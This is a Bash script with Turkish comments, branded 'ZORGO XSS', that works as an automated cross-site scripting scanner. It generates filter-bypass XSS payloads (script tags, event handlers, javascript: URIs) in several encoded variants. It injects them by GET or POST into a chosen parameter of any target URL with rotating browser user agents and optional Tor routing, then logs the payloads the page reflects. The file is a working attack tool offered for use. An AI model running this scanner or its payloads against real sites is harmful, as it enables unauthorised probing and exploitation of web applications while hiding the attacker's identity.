#!/bin/bash

# ==============================================
# ███████╗ ██████╗ ██████╗  ██████╗  ██████╗ 
# ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝ ██╔═══██╗
#   ███╔╝ ██║   ██║██████╔╝██║  ███╗██║   ██║
#  ███╔╝  ██║   ██║██╔══██╗██║   ██║██║   ██║
# ███████╗╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝
# ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ 
#         ZORGO XSS - v3.0 Bypass Modüllü
# ==============================================

# Renkler
KIRMIZI='\033[0;31m'
YESIL='\033[0;32m'
SARI='\033[1;33m'
MAVI='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Rastgele User-Agent
random_ua() {
    ua_list=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile/15E148"
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0"
    )
    echo "${ua_list[$RANDOM % ${#ua_list[@]}]}"
}

# URL Encode (jq olmadan)
url_encode() {
    local string="$1"
    local encoded=""
    local pos c o
    for ((pos=0; pos<${#string}; pos++)); do
        c="${string:$pos:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) printf -v o '%%%02X' "'$c"; encoded+="$o" ;;
        esac
    done
    echo "$encoded"
}

# Payload Üreteci (150+)
generate_payloads() {
    # Temel XSS payloadları
    base=(
        "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "<svg/onload=alert(1)>"
        "javascript:alert(1)"
        "\"><script>alert(1)</script>"
        "'><script>alert(1)</script>"
        "</script><script>alert(1)</script>"
        "&lt;script&gt;alert(1)&lt;/script&gt;"
        "&#60;script&#62;alert(1)&#60;/script&#62;"
        "<script\\u0020>alert(1)</script>"
        "<scr<script>ipt>alert(1)</scr</script>ipt>"
        "<ScRiPt>alert(1)</ScRiPt>"
        "\" onmouseover=\"alert(1)\""
        "' onfocus='alert(1)' autofocus"
        "alert`1`"
        "javascript:/*--></script></textarea></style>alert(1)//"
    )
    
    # Çeşitli bypass teknikleri ekleyelim
    for p in "${base[@]}"; do
        echo "$p"
        # URL encode
        echo "$(url_encode "$p")"
        # Double URL encode
        encoded=$(url_encode "$p")
        echo "$(url_encode "$encoded")"
        # HTML entity encode (elle)
        echo "$p" | sed 's/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'\''/\&#39;/g'
        # Unicode varyant (kabaca)
        echo "$p" | sed 's/</\\u003c/g; s/>/\\u003e/g'
    done
}

# İlerleme çubuğu
progress() {
    local current=$1
    local total=$2
    local percent=$((current * 100 / total))
    printf "\r${CYAN}[%3d%%]${NC} %d/%d payload işleniyor..." "$percent" "$current" "$total"
}

# XSS test fonksiyonu
test_xss() {
    local url=$1
    local param=$2
    local method=$3
    local proxy=$4
    local delay=$5
    local output=$6

    mapfile -t payloads < <(generate_payloads)
    total=${#payloads[@]}
    echo -e "${SARI}[*] Hedef: $url | Parametre: $param | Metod: $method | Toplam Payload: $total${NC}"
    
    local proxy_arg=""
    [[ -n "$proxy" ]] && proxy_arg="-x $proxy"

    local count=0
    local findings=0

    for payload in "${payloads[@]}"; do
        count=$((count+1))
        progress "$count" "$total"

        # URL oluştur
        if [[ "$method" == "GET" ]]; then
            if [[ "$url" =~ ([?&])${param}=[^&]* ]]; then
                test_url=$(echo "$url" | sed "s/\([?&]${param}=\)[^&]*/\1${payload}/")
            else
                if [[ "$url" == *\?* ]]; then
                    test_url="${url}&${param}=${payload}"
                else
                    test_url="${url}?${param}=${payload}"
                fi
            fi
            response=$(curl -s -L $proxy_arg -A "$(random_ua)" --connect-timeout 5 "$test_url")
        else
            # POST
            response=$(curl -s -L -X POST $proxy_arg -A "$(random_ua)" --connect-timeout 5 -d "${param}=${payload}" "$url")
        fi

        # Yansıma kontrolü
        if echo "$response" | grep -qF "$payload"; then
            findings=$((findings+1))
            echo -e "\n${KIRMIZI}[!] XSS POTANSİYELİ:${NC} $payload"
            echo "[$(date)] $url | $param | $payload" >> "$output"
        fi

        sleep "$delay"
    done

    echo -e "\n${YESIL}[✓] Tamamlandı. Potansiyel XSS sayısı: $findings${NC}"
}

# Yardım
usage() {
    echo "Kullanım: $0 -u <URL> -p <parametre> [seçenekler]"
    echo "  -u <URL>         Hedef URL (örn: http://site.com/page.php?name=test)"
    echo "  -p <parametre>    Parametre adı (örn: name)"
    echo "  -m <GET/POST>     HTTP metodu (varsayılan: GET)"
    echo "  -x <proxy>        Proxy (örn: socks5://127.0.0.1:9050)"
    echo "  -d <saniye>       İstekler arası bekleme (varsayılan: 0.5)"
    echo "  -o <dosya>        Rapor dosyası (varsayılan: xss_rapor.txt)"
    echo "  --tor             Tor kullan (socks5://127.0.0.1:9050)"
    echo "  -h, --help        Bu yardım"
    exit 0
}

# Ana parametreler
METHOD="GET"
DELAY=0.5
OUTPUT="xss_rapor.txt"
PROXY=""
URL=""
PARAM=""

[[ $# -eq 0 ]] && usage

while [[ $# -gt 0 ]]; do
    case "$1" in
        -u) URL="$2"; shift 2 ;;
        -p) PARAM="$2"; shift 2 ;;
        -m) METHOD="$2"; shift 2 ;;
        -x) PROXY="$2"; shift 2 ;;
        -d) DELAY="$2"; shift 2 ;;
        -o) OUTPUT="$2"; shift 2 ;;
        --tor) PROXY="socks5://127.0.0.1:9050"; shift ;;
        -h|--help) usage ;;
        *) echo "Bilinmeyen parametre: $1"; usage ;;
    esac
done

# Kontroller
if [[ -z "$URL" || -z "$PARAM" ]]; then
    echo -e "${KIRMIZI}[-] URL ve parametre belirtilmelidir!${NC}"
    usage
fi

# Rapor dosyasını sıfırla
> "$OUTPUT"

# Başlangıç mesajı
clear
echo -e "${KIRMIZI}"
cat << "EOF"
███████╗ ██████╗ ██████╗  ██████╗  ██████╗ 
╚══███╔╝██╔═══██╗██╔══██╗██╔════╝ ██╔═══██╗
  ███╔╝ ██║   ██║██████╔╝██║  ███╗██║   ██║
 ███╔╝  ██║   ██║██╔══██╗██║   ██║██║   ██║
███████╗╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝
╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ 
         ZORGO XSS - Bypass Modüllü
EOF
echo -e "${NC}"
sleep 1

# Taramayı başlat
test_xss "$URL" "$PARAM" "$METHOD" "$PROXY" "$DELAY" "$OUTPUT"

echo -e "${YESIL}Rapor kaydedildi: $OUTPUT${NC}"
